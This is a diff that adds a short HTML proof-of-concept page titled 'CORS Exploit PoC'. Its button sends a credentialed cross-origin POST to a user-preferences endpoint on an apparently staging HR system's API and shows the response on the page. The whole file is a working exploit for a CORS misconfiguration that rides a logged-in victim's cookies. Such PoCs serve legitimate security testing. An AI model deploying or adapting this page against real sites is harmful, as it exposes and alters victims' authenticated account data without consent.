@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CORS Exploit PoC</title>
+</head>
+<body>
+  <h2>CORS Exploit PoC</h2>
+  <button onclick="send()">Exploit</button>
+
+  <pre id="output"></pre>
+
+  <script>
+    function send() {
+      fetch("https://api.stg.hrms.test.com/svc/hrms-api/widget/rosterstatus/settings/userpreferences", {
+        method: "POST",
+        mode: "cors",
+        credentials: "include",
+        headers: {
+          "Content-Type": "text/plain;charset=UTF-8",
+          "Accept": "*/*"
+        },
+        body: JSON.stringify({
+          test: "poc"
+        })
+      })
+      .then(res => res.text())
+      .then(data => {
+        document.getElementById("output").innerText = "Response:\n" + data;
+      })
+      .catch(err => {
+        document.getElementById("output").innerText = "Error:\n" + err;
+      });
+    }
+  </script>
+</body>
+</html>
